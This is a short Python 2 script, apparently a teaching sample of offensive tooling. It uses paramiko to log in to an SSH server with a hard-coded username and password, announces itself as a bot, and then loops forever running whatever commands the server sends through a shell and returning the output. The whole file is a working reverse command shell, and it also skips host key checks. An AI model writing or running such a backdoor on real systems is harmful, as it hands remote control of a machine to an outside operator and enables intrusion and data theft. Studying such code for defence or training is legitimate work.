import threading
import paramiko
import sys
import subprocess

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('/home/justin/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=user, password=passwd, port=port)
    except paramiko.ssh_exception.AuthenticationException, e:
        print "[-] SSH Authentication failed."
        sys.exit(0)


    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(1024)  # Get banner from server
        while True:
            command = ssh_session.recv(1024)  # Get command from server
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))
        client.close()
    return

ssh_command('127.0.0.1', 27015, 'nanodano', 'passy', 'bot, reporting for duty')

